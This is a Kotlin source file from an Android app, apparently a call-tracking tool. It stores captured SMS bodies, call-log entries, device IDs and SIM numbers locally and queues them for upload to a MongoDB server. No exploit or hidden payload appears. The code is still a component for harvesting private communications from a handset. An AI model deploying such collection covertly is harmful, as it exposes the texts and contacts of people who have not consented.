package com.calltech

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Phone se capture hua data local save — app UI + MongoDB sync ke liye.
 * Pending items sync hone ke baad queue se remove hote hain.
 */
object LocalDataStore {
    private const val TAG = "LocalDataStore"
    private const val PREFS = "calltech_local_data"
    private const val KEY_MESSAGES = "messages_json"
    private const val KEY_CALLS = "calls_json"
    private const val MAX_ITEMS = 5000

    fun saveMessage(
        context: Context,
        phoneNumber: String,
        body: String,
        timestamp: Long,
        source: String = "local_capture",
        type: String = "INBOX",
    ) {
        val phone = phoneNumber.trim().ifBlank { "Unknown" }
        val text = body.trim()
        if (text.isEmpty()) {
            return
        }

        val eventId = "${sanitize(phone)}_${timestamp}_${text.hashCode()}"
        val deviceId = DeviceIdHelper.getDeviceId(context)
        val simNumber = SimNumberHelper.getBestKnownSimNumber(context)
        val item = JSONObject().apply {
            put("id", DeviceIdHelper.buildDocumentId(deviceId, eventId))
            put("eventId", eventId)
            put("deviceId", deviceId)
            put("phoneNumber", phone)
            put("name", phone)
            put("body", text)
            put("message", text)
            put("type", type)
            put("timestamp", timestamp)
            put("dateTime", formatDate(timestamp))
            put("simNumber", simNumber)
            put("syncedFrom", source)
            put("syncStatus", "pending")
        }

        appendItem(context, KEY_MESSAGES, item, item.optString("id"))
        Log.d(TAG, "Message saved locally: $phone")
    }

    fun saveCall(
        context: Context,
        phoneNumber: String,
        name: String?,
        type: String,
        durationSeconds: Long,
        timestamp: Long,
        source: String = "local_capture",
    ) {
        val phone = phoneNumber.trim().ifBlank { "Unknown" }
        val eventId = "${sanitize(phone)}_$timestamp"
        val deviceId = DeviceIdHelper.getDeviceId(context)
        val callType = type.uppercase(Locale.US)
        val duration = durationSeconds.coerceAtLeast(0)
        val simNumber = SimNumberHelper.ensureSimReadyForSync(context)

        val item = JSONObject().apply {
            put("id", DeviceIdHelper.buildDocumentId(deviceId, eventId))
            put("eventId", eventId)
            put("deviceId", deviceId)
            put("phoneNumber", phone)
            put("name", name?.trim()?.ifBlank { phone } ?: phone)
            put("type", callType)
            put("duration", duration)
            put("durationSeconds", duration)
            put("durationFormatted", formatDuration(duration))
            put("timestamp", timestamp)
            put("dateTime", formatDate(timestamp))
            put("simNumber", simNumber)
            put("syncedFrom", source)
            put("syncStatus", "pending")
        }

        appendItem(context, KEY_CALLS, item, item.optString("id"))
        Log.d(TAG, "Call saved locally: $phone ($callType)")
    }

    fun getMessages(context: Context): List<Map<String, Any>> {
        return readItems(context, KEY_MESSAGES)
    }

    fun getCalls(context: Context): List<Map<String, Any>> {
        return readItems(context, KEY_CALLS)
    }

    fun getPendingMessages(context: Context): List<Map<String, Any>> {
        return getMessages(context).filter { isPending(it) }
    }

    fun getPendingCalls(context: Context): List<Map<String, Any>> {
        return getCalls(context).filter { isPending(it) }
    }

    fun syncAllToMongo(context: Context, source: String = "local_store") {
        syncPendingToMongo(context, source)
    }

    fun syncPendingToMongo(context: Context, source: String = "local_store") {
        val app = context.applicationContext
        val messages = getPendingMessages(app)
        val calls = getPendingCalls(app)

        if (messages.isNotEmpty()) {
            val ok = MongoSyncHelper.syncMessagesNow(app, messages)
            if (ok) {
                markSynced(app, KEY_MESSAGES, messages.mapNotNull { it["id"]?.toString() }.toSet())
                Log.d(TAG, "Local messages → MongoDB: ${messages.size}")
            } else {
                Log.e(TAG, "Local messages Mongo sync failed")
            }
        }

        if (calls.isNotEmpty()) {
            SimNumberHelper.ensureSimReadyForSync(app)
            val ok = MongoSyncHelper.syncCallLogsNow(app, calls)
            if (ok) {
                markSynced(app, KEY_CALLS, calls.mapNotNull { it["id"]?.toString() }.toSet())
                Log.d(TAG, "Local calls → MongoDB: ${calls.size}")
            } else {
                Log.e(TAG, "Local calls Mongo sync failed")
                calls.forEach { PendingCallQueue.enqueue(app, it) }
            }
        }

        if (messages.isEmpty() && calls.isEmpty()) {
            Log.d(TAG, "Local store has no pending items ($source)")
        }
    }

    fun markCallSynced(context: Context, callId: String) {
        markSynced(context.applicationContext, KEY_CALLS, setOf(callId))
    }

    fun markMessageSynced(context: Context, messageId: String) {
        markSynced(context.applicationContext, KEY_MESSAGES, setOf(messageId))
    }

    private fun isPending(item: Map<String, Any>): Boolean {
        val status = item["syncStatus"]?.toString()?.lowercase(Locale.US)
        return status != "synced"
    }

    private fun markSynced(context: Context, key: String, syncedIds: Set<String>) {
        if (syncedIds.isEmpty()) {
            return
        }

        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val array = JSONArray(prefs.getString(key, "[]") ?: "[]")
        val remaining = JSONArray()

        for (index in 0 until array.length()) {
            val obj = array.optJSONObject(index) ?: continue
            val id = obj.optString("id")
            if (syncedIds.contains(id)) {
                continue
            }
            remaining.put(obj)
        }

        prefs.edit().putString(key, remaining.toString()).apply()
    }

    private fun appendItem(context: Context, key: String, item: JSONObject, docId: String) {
        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val array = JSONArray(prefs.getString(key, "[]") ?: "[]")

        for (index in 0 until array.length()) {
            val existing = array.optJSONObject(index) ?: continue
            if (existing.optString("id") == docId) {
                return
            }
        }

        array.put(item)
        trimArray(array)

        prefs.edit().putString(key, array.toString()).apply()
    }

    private fun readItems(context: Context, key: String): List<Map<String, Any>> {
        val raw = context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(key, "[]") ?: "[]"

        val array = JSONArray(raw)
        val items = mutableListOf<Map<String, Any>>()

        for (index in 0 until array.length()) {
            val obj = array.optJSONObject(index) ?: continue
            items.add(jsonToMap(obj))
        }

        return items.sortedByDescending { (it["timestamp"] as? Number)?.toLong() ?: 0L }
    }

    private fun jsonToMap(obj: JSONObject): Map<String, Any> {
        val map = mutableMapOf<String, Any>()
        obj.keys().forEach { key ->
            map[key] = when (val value = obj.get(key)) {
                is Number -> value
                else -> value.toString()
            }
        }
        return map
    }

    private fun trimArray(array: JSONArray) {
        while (array.length() > MAX_ITEMS) {
            array.remove(0)
        }
    }

    private fun sanitize(value: String): String {
        return value.replace(Regex("[^a-zA-Z0-9+]"), "")
    }

    private fun formatDate(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
    }

    private fun formatDuration(seconds: Long): String {
        val minutes = seconds / 60
        val remaining = seconds % 60
        return if (minutes > 0) "${minutes}m ${remaining}s" else "${remaining}s"
    }
}
